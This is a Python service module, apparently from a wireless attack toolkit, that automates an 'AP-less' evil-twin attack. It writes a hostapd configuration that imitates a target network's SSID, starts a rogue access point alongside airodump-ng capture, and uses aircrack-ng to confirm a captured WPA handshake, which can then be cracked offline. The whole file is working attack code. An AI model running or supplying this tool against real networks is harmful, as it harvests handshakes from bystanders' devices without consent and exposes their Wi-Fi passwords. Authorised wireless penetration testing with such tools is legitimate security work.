"""
AP-Less Attack Service.

Creates a honeypot AP mimicking a target SSID using hostapd.
When a client with the target SSID in its PNL tries to connect,
the WPA handshake is captured even though the real AP is absent.

Requires TWO wireless adapters:
  - monitor_interface: in monitor mode, running airodump-ng to capture the handshake
  - ap_interface: in managed mode, running hostapd as the fake AP

Based on Chapter 14 — "Performing AP-less Attacks" methodology.
"""

import uuid
import glob
import asyncio
import logging
from datetime import datetime
from typing import Optional
from app.config import settings
from app.models.schemas import ApLessAttackRequest, ScanStatus
from app.utils.process_manager import process_manager

logger = logging.getLogger(__name__)


class ApLessService:
    def __init__(self):
        self._active: Optional[dict] = None
        self._results: dict[str, dict] = {}

    async def start(self, req: ApLessAttackRequest) -> dict:
        """
        Launch AP-less attack:
        1. Generate hostapd config with target ESSID + fake passphrase
        2. Start airodump-ng on monitor interface to capture handshake
        3. Start hostapd on AP interface to broadcast fake AP
        4. Wait for wireless client to probe and attempt authentication
        5. Capture the WPA handshake from the failed auth attempt
        """
        attack_id = str(uuid.uuid4())[:8]
        capture_prefix = str(settings.HANDSHAKES_DIR / f"apless_{attack_id}")

        # ── Step 1: Create hostapd config ──
        hostapd_conf = str(settings.HOSTAPD_DIR / f"apless_{attack_id}.conf")
        cipher = "CCMP" if req.wpa_version == 2 else "TKIP"
        wpa_val = req.wpa_version

        config_content = (
            f"interface={req.ap_interface}\n"
            f"driver=nl80211\n"
            f"ssid={req.target_essid}\n"
            f"wpa={wpa_val}\n"
            f"wpa_passphrase={req.fake_passphrase}\n"
            f"wpa_key_mgmt=WPA-PSK\n"
            f"rsn_pairwise={cipher}\n"
            f"channel={req.channel}\n"
        )

        with open(hostapd_conf, "w") as f:
            f.write(config_content)

        logger.info(f"[{attack_id}] AP-less attack config: ESSID={req.target_essid}, CH={req.channel}, WPA{wpa_val}")

        # ── Step 2: Start airodump-ng to capture handshake ──
        airodump_cmd = [
            "airodump-ng",
            "-c", str(req.channel),
            "--essid", req.target_essid,
            "-w", capture_prefix,
            "--output-format", "pcap,csv",
            req.monitor_interface,
        ]

        airodump_task = asyncio.create_task(
            process_manager.run(airodump_cmd, timeout=req.capture_timeout)
        )

        # ── Step 3: Start hostapd (wait a moment for airodump to initialize) ──
        await asyncio.sleep(3)

        hostapd_task = asyncio.create_task(
            process_manager.run(["hostapd", hostapd_conf], timeout=req.capture_timeout)
        )

        self._active = {
            "id": attack_id,
            "essid": req.target_essid,
            "channel": req.channel,
            "monitor_interface": req.monitor_interface,
            "ap_interface": req.ap_interface,
            "hostapd_conf": hostapd_conf,
            "capture_prefix": capture_prefix,
            "started_at": datetime.now().isoformat(),
        }

        # ── Step 4: Wait for completion ──
        airodump_result = await airodump_task

        # Kill hostapd
        await process_manager.run_sync(["pkill", "-f", f"hostapd.*{attack_id}"], timeout=5)

        # ── Step 5: Check for handshake ──
        handshake_found = False
        cap_files = glob.glob(f"{capture_prefix}*.cap")
        if cap_files:
            check_out, _, _ = await process_manager.run_sync(
                ["aircrack-ng", cap_files[0]], timeout=10
            )
            handshake_found = "1 handshake" in check_out.lower() or "pmkid" in check_out.lower()

        result = {
            "id": attack_id,
            "handshake_captured": handshake_found,
            "capture_file": cap_files[0] if cap_files else None,
            "all_files": glob.glob(f"{capture_prefix}*"),
            "target_essid": req.target_essid,
            "channel": req.channel,
            "method": "ap_less_honeypot",
            "hostapd_output": "\n".join((await hostapd_task).stdout_lines[-20:]) if hostapd_task.done() else "",
        }

        self._results[attack_id] = result
        self._active = None
        return result

    async def stop(self) -> dict:
        """Stop active AP-less attack."""
        await process_manager.run_sync(["pkill", "-f", "hostapd"], timeout=5)
        active = self._active
        self._active = None
        return {"stopped": True, "attack": active}

    def status(self) -> dict:
        return {"active": self._active is not None, "attack": self._active}

    def get_result(self, attack_id: str) -> Optional[dict]:
        return self._results.get(attack_id)

    def list_results(self) -> list[dict]:
        return list(self._results.values())


apless_service = ApLessService()
